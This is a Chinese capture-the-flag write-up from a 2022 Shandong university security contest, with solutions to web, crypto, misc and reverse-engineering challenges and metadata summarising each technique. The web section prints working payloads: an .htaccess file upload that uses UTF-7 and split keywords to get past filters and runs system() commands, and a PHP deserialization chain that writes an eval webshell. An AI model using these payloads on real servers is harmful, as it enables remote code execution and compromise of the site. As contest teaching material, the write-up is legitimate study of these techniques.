---
title: 第六届山东省大学生电子设计大赛——网络安全技能竞赛 writeup by M1mikatz
contest: 山东省大学生电子设计大赛
year: 2022
difficulty: medium
vuln_type: file_upload
tags:
- Web-upload
- .htaccess
- UTF-7
- 加换行
- 反序列化
- 成员数绕
- MT19937
- mt_recover
- DSA-r1r2
- AntSword流量
- RGB转二维码
- ezxor
- arbitrary
attack_chain: 'upload_100(同另一篇,含# define width 1337 trick+SetHandler+UTF-7+加换行)|pop_200: Show_index->Transfer->Transfer->File_operations链|签到/凯撒/三层base|mt: 32位素数+init+enc+recover+rrecover推|easy: DSA r1=r2|hacker: 蚁剑流量147流zip|draw: RGB转01+PIL画图|ezxor: x[i]^y[i]^ord(''a'')|arbitrary: read(14)+read(15)+write(-0x2)'
key_payload: '# define width 1337 + SetHandler application/x-httpd-php + UTF-7+ADw?+AD0-system+换行绕关键字|class Transfer->method=Transfer->method=File_operations|recover(c)=inverse_right(18)+inverse_left_mask(15,4022730752)+inverse_left_mask(7,2636928640)+inverse_right(11)|rrecover(last)=((last-i)*inv)%n|k=(h1*r2-h2*r1)*invert(s1*r2-s2*r1,q)%q; flag=(k*s1-h1)*invert(r1,q)%q'
one_liner: M1mikatz版同题合集,完整payload:#define width 1337+UTF-7+加换行+反序列化成员数绕+MT19937逆推+DSA r1=r2+蚁剑流量+RGB二维码+ezxor+arbitrary
lesson: '1) .htaccess首行#define width 1337 #define height 1337 满足尺寸限制; 2) SetHandler application/x-httpd-php+UTF-7编码(php_flag zend.multibyte 1)+加换行绕关键字; 3) 蚁剑流量特征:b1709fecc8bc5e=doL3Zhci93d3cvaHRtbC91cGxvYWQvcGFzc3dvcmQuanBn(从第二个字符开始是base64); 4) MT19937逆推:recover(4步逆XOR) + rrecover(逆init 100轮) + flag=md5(str(flag)); 5) DSA r1=r2:+已知h1,h2,s1,s2,r1,q 即可逆出k和flag'
quality: high
full_path: 第六届山东省大学生电子设计大赛——网络安全技能竞赛_writeup_by_M1mikatz.full.md
meta_path: 第六届山东省大学生电子设计大赛——网络安全技能竞赛_writeup_by_M1mikatz.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: '第六届山东省大学生电子设计大赛——网络安全技能竞赛 writeup by M1mikatz。M1mikatz版同题合集,完整payload:#define width 1337+UTF-7+加换行+反序列化成员数绕+MT19937逆推+DSA r1=r2+蚁剑流量+RGB二维码+ezxor+arbitrary。经验：1) .htaccess首行#define width 1337 #defi...'
category: web
subcategory: web_other
tools_used:
- Radare2
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: school
wp_url: https://www.ctfiot.com/87116.html
wp_author: M1mikatz
reasoning_chain:
- 触发点：upload_100 同题（参见 file 9）→ 假设：.htaccess 解析为 PHP
- 动作：上传 SetHandler application/x-httpd-php + Files allow from all + UTF-7 + 加换行拆分关键字 → 观察：绕 WAF
- 假设：关键字被过滤 → 动作：<Fi\nles ~> 拆关键字 → 观察：拆分后绕过
- pop_200：触发点：成员数绕过 __wakeup → 假设：PHP 5 unserialize bug
- 动作：构造序列化数据使成员数 > 实际属性 → 观察：跳过 __wakeup
- Crypto 三层 base：触发点：flag 看起来像 base64 → 假设：连续 base64 三次
- MT19937 预测：触发点：getPrime(32) 32bit 整数有限 → 假设：正序逆序 2^31~2^32 全枚举
- 蚁剑流量分析：触发点：流量含 webshell trace → 假设：base64 解码流量还原命令
failed_attempts:
- upload_100 单行 .htaccess → 失败：关键字被卡
- pop_200 直接 serialize 单类 → 失败：缺 trigger
- 三层 base 试图一次解码 → 失败：需连解三次
key_observations:
- .htaccess 关键字可加换行绕过（<Fi\nles> 等）
- 成员数绕过 __wakeup 是 PHP5 反序列化历史 bug（PHP5.4.5-5.4.30 等）
- 三层 base64 编码 = base64(base64(base64(plain)))
- MT19937 32bit 整数 seed 枚举 2^31~2^32 可在分钟内完成
prerequisites:
- .htaccess 加换行绕过 WAF 技巧
- PHP5 成员数绕过 __wakeup 漏洞
- MT19937 状态机逆推
- 蚁剑 webshell 流量识别
---
# 第六届山东省大学生电子设计大赛——网络安全技能竞赛 writeup by M1mikatz

> 原文: https://www.ctfiot.com/87116.html
> ID: 87116

第六届山东省大学生电子设计大赛 

网络安全技能竞赛 

writeup by M1mikatz

为深入贯彻落实科教强鲁人才兴鲁战略，服务人才培养和创新省份建设，围绕中央网信办、教育部印发的《一流网络安全学院建设示范项目管理办法》加快高等院校网络安全及相关学科建设和人才培养，逐步建成全省网络安全产业人才聚集高地,举办第六届山东省大学生电子设计大赛——网络安全技能竞赛。在本次竞赛中，网安社的三支代表队分别获得了第一名，第三名，第七名的优异成绩。

Web

upload_100

一个文件上传，只能上传 .htaccess：
并且对文件内容进行过滤。并且upload目录下面没有php文件，因此考虑将 .htaccess 解析为 php文件使用。

注意，题目似乎对上传文件的尺寸做了限制，需要在 .htaccess 开头定义好大小。别问为什么，试出来的。。。。。。

#define width 1337
#define height 1337

需要先在 .htaccess 里面设置允许访问 .htaccess 文件，否则是直接访问 .htaccess 文件是Forbidden的：

<Files ~ "^.ht">
 Require all granted
 Order allow,deny
 Allow from all
</Files>

然后再设置将 .htaccess 指定当做 PHP 文件处理并解析：

SetHandler application/x-httpd-php
# <?=system($_POST[whoami]);?>

最终 .htaccess 文件里面的内容为：

<Files ~ "^.ht">
 Require all granted
 Order allow,deny
 Allow from all
</Files>
SetHandler application/x-httpd-php
# <?=system($_POST[whoami]);?>

但是文件内容过滤了很多关键字，并且 <?= 也被过滤了，我们可以使用  UTF-7 编码绕过，即：

<Files ~ "^.ht">
 Require all granted
 Order allow,deny
 Allow from all
</Files>
SetHandler application/x-httpd-php
php_flag zend.multibyte 1
php_value zend.script_encoding "UTF-7"
# +ADw?+AD0-system(+ACQAXw-POST+AFs-whoami+AF0)+ADs?+AD4

然后使用 加换行绕过其他的关键字，最终的payload如下：

#define width 1337
#define height 1337
<Fi
les ~ "^.ht">
 Require all granted
 Order allow,deny
 Allow from all
</Fi
les>
SetHa
ndler applic
ation/x-h
ttpd-p
hp
ph
p_flag zend.multibyte 1
ph
p_val
ue zend.script_encoding "UTF-7"
# +ADw?+AD0-system(+ACQAXw-POST+AFs-whoami+AF0)+ADs?+AD4

然后我们直接访问 .htaccess 文件即可把 .htaccess 文件当做 PHP 文件处理并执行里面的 PHP 代码：
pop_200

很简单一反序列化，php 5 的环境，直接用成员数绕过 __wakeup，然后写webshell即可：

<?php
error_reporting(0);

class File_operations {
    protected $filename='/var/www/html/shell.php';
}

class Show_index {
    public $filepage;
}

class Exception_process {
    public $arg;
}

class Transfer  {
    public $method;
    private $parameter = "<?php eval($_POST[a]);";
}

$poc = new Show_index();
$poc->filepage = new Transfer();
$poc->filepage->method = new Transfer();
$poc->filepage->method->method = new File_operations();
echo urlencode(serialize($poc));

Crypto

签到
然后维吉尼亚解密

在凯撒

第二轮签到题

三层base

mt

mt19937的预测，照着逻辑给逆回去就行

https://blog.csdn.net/shshss64/article/details/127326357

from Crypto.Util.number import *
import gmpy2
import hashlib
 
# right shift inverse
def inverse_right(res, shift):
    tmp = res
    bits = len(bin(res)[2:])
    for i in range(bits // shift):
        tmp = res ^ tmp >> shift
    return tmp
 
 
# right shift with mask inverse
def inverse_right_mask(res, shift, mask):
    tmp = res
    bits = len(bin(res)[2:])
    for i in range(bits // shift):
        tmp = res ^ tmp >> shift & mask
    return tmp
 
# left shift inverse
def inverse_left(res, shift):
    tmp = res
    bits = len(bin(res)[2:])
    for i in range(bits // shift):
        tmp = res ^ tmp << shift
    return tmp
 
 
# left shift with mask inverse
def inverse_left_mask(res, shift, mask):
    tmp = res
    bits = len(bin(res)[2:])
    for i in range(bits // shift):
        tmp = res ^ tmp << shift & mask
    return tmp
 
 
def enc(y):
    y = y ^ y >> 11
    y = y ^ y << 7 & 2636928640
    y = y ^ y << 15 & 4022730752
    y = y ^ y >> 18
    return y&0xffffffff
 
def recover(y):
    y = inverse_right(y,18)
    y = inverse_left_mask(y,15,4022730752)
    y = inverse_left_mask(y,7,2636928640)
    y = inverse_right(y,11)
    return y
 
 
def rrecover(last):
 n = 1<<32
 inv = gmpy2.invert(1812433253,n)
 for i in range(99,0,-1):
  last = ((last-i)*inv)%n
  last = inverse_right(last,30)
 return last
 
c = 1047573452
tmp = recover(c)
flag = rrecover(tmp)
print(flag)
print('flag{'+hashlib.md5(str(flag).encode()).hexdigest()+'}')

easy

dsa加密，注意到r1和r2其实相同，先行把flag约去求得k后，再反代求出flag

from Crypto.Util.number import *
import gmpy2
import hashlib
h1,h2,s1,s2,r1,q = [818128692003030167977053277109430684611703076399,486498008062394064249282337122659834542436448201,247121551505513420409531383106944282908920522414,754913008212620944684250081707312932655139381276,1309822693949102705754289540573759976438632888627,1328243644040291196447577554903037460035141284781]
r2 = r1
k = (h1 * r2 - h2 * r1) * gmpy2.invert(s1 * r2 - s2 * r1,q) % q
flag = (k * s1 - h1) * gmpy2.invert(r1,q) % q
print(flag)
print(long_to_bytes(flag))
print('flag{' + hashlib.md5(str(flag).encode()).hexdigest() + '}')

Misc

hacker

按照协议排序，找到http流
发现是蚁剑流量，挨个解

找到密码：

在第147流里找到zip

提出来解压得到flag

image-20221221124122246

Draw

255和0那些rgb值分别转01，用记事本就行
然后画二维码

from PIL import Image
MAX = 400
pic = Image.new("RGB",(MAX, MAX))
str = '000000000000000000000000000.....................0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'
i=0
for y in range (0,MAX):
    for x in range (0,MAX):
        if(str[i] == '1'):
            pic.putpixel([x,y],(0, 0, 0))
        else:
            pic.putpixel([x,y],(255,255,255))
        i = i+1
pic.show()
pic.save("11.png")

然后扫二维码

Re

ezxor

转dec
输入38个a，动态调试与随机数异或之后得到x，在和y异或

y = [169,178,231,186,187,120,180,187,152,171,222,58,165,156,215,149,93,219,31,160,26,50,88,254,197,99,197,46,79,38,26,65,91,191,128,141,138,189]
x = [0xAE, 0xBF, 0xE7, 0xBC, 0xA1, 0x7A, 0xE5, 0xEA, 0x98, 0xF9, 0x8B, 0x39, 0xA5, 0x9B, 0x8E, 0x95, 0x04, 0xDE, 0x1A, 0xA2, 0x4A, 0x36, 0x0C, 0xAF, 0xC5, 0x32, 0xC2, 0x7F, 0x4A, 0x70, 0x19, 0x15, 0x58, 0xEE, 0x84, 0xDD, 0xDC, 0xA1]
flag = ''
for i in range(38):
 flag += chr(x[i]^y[i]^ord('a'))
print(flag)


```
    #define width 1337
    #define height 1337
<Files ~ "^.ht">
 Require all granted
 Order allow,deny
 Allow from all
</Files>
SetHandler application/x-httpd-php
# <?=system($_POST[whoami]);?>
<Files ~ "^.ht">
 Require all granted
 Order allow,deny
 Allow from all
</Files>
SetHandler application/x-httpd-php
# <?=system($_POST[whoami]);?>
<Files ~ "^.ht">
 Require all granted
 Order allow,deny
 Allow from all
</Files>
SetHandler application/x-httpd-php
php_flag zend.multibyte 1
php_value zend.script_encoding "UTF-7"
# +ADw?+AD0-system(+ACQAXw-POST+AFs-whoami+AF0)+ADs?+AD4
    #define width 1337
    #define height 1337
<Fi
les ~ "^.ht">
 Require all granted
 Order allow,deny
 Allow from all
</Fi
les>
SetHa
ndler applic
ation/x-h
ttpd-p
hp
ph
p_flag zend.multibyte 1
ph
p_val
ue zend.script_encoding "UTF-7"
# +ADw?+AD0-system(+ACQAXw-POST+AFs-whoami+AF0)+ADs?+AD4
<?php
error_reporting(0);

class File_operations {
    protected $filename='/var/www/html/shell.php';
}

class Show_index {
    public $filepage;
}

class Exception_process {
    public $arg;
}

class Transfer  {
    public $method;
    private $parameter = "<?php eval($_POST[a]);";
}

$poc = new Show_index();
$poc->filepage = new Transfer();
$poc->filepage->method = new Transfer();
$poc->filepage->method->method = new File_operations();
echo urlencode(serialize($poc));
from Crypto.Util.number import *
import gmpy2
import hashlib
 
# right shift inverse
def inverse_right(res, shift):
    tmp = res
    bits = len(bin(res)[2:])
    for i in range(bits // shift):
        tmp = res ^ tmp >> shift
    return tmp
 
 
# right shift with mask inverse
def inverse_right_mask(res, shift, mask):
    tmp = res
    bits = len(bin(res)[2:])
    for i in range(bits // shift):
        tmp = res ^ tmp >> shift & mask
    return tmp
 
# left shift inverse
def inverse_left(res, shift):
    tmp = res
    bits = len(bin(res)[2:])
    for i in range(bits // shift):
        tmp = res ^ tmp << shift
    return tmp
 
 
# left shift with mask inverse
def inverse_left_mask(res, shift, mask):
    tmp = res
    bits = len(bin(res)[2:])
    for i in range(bits // shift):
        tmp = res ^ tmp << shift & mask
    return tmp
 
 
def enc(y):
    y = y ^ y >> 11
    y = y ^ y << 7 & 2636928640
    y = y ^ y << 15 & 4022730752
    y = y ^ y >> 18
    return y&0xffffffff
 
def recover(y):
    y = inverse_right(y,18)
    y = inverse_left_mask(y,15,4022730752)
    y = inverse_left_mask(y,7,2636928640)
    y = inverse_right(y,11)
    return y
 
 
def rrecover(last):
 n = 1<<32
 inv = gmpy2.invert(1812433253,n)
 for i in range(99,0,-1):
  last = ((last-i)*inv)%n
  last = inverse_right(last,30)
 return last
 
c = 1047573452
tmp = recover(c)
flag = rrecover(tmp)
print(flag)
print('flag{'+hashlib.md5(str(flag).encode()).hexdigest()+'}')
from Crypto.Util.number import *
import gmpy2
import hashlib
h1,h2,s1,s2,r1,q = [818128692003030167977053277109430684611703076399,486498008062394064249282337122659834542436448201,247121551505513420409531383106944282908920522414,754913008212620944684250081707312932655139381276,1309822693949102705754289540573759976438632888627,1328243644040291196447577554903037460035141284781]
r2 = r1
k = (h1 * r2 - h2 * r1) * gmpy2.invert(s1 * r2 - s2 * r1,q) % q
flag = (k * s1 - h1) * gmpy2.invert(r1,q) % q
print(flag)
print(long_to_bytes(flag))
print('flag{' + hashlib.md5(str(flag).encode()).hexdigest() + '}')
from PIL import Image
MAX = 400
pic = Image.new("RGB",(MAX, MAX))
str = '000000000000000000000000000.....................0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'
i=0
for y in range (0,MAX):
    for x in range (0,MAX):
        if(str[i] == '1'):
            pic.putpixel([x,y],(0, 0, 0))
        else:
            pic.putpixel([x,y],(255,255,255))
        i = i+1
pic.show()
pic.save("11.png")
y = [169,178,231,186,187,120,180,187,152,171,222,58,165,156,215,149,93,219,31,160,26,50,88,254,197,99,197,46,79,38,26,65,91,191,128,141,138,189]
x = [0xAE, 0xBF, 0xE7, 0xBC, 0xA1, 0x7A, 0xE5, 0xEA, 0x98, 0xF9, 0x8B, 0x39, 0xA5, 0x9B, 0x8E, 0x95, 0x04, 0xDE, 0x1A, 0xA2, 0x4A, 0x36, 0x0C, 0xAF, 0xC5, 0x32, 0xC2, 0x7F, 0x4A, 0x70, 0x19, 0x15, 0x58, 0xEE, 0x84, 0xDD, 0xDC, 0xA1]
flag = ''
for i in range(38):
 flag += chr(x[i]^y[i]^ord('a'))
print(flag)
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]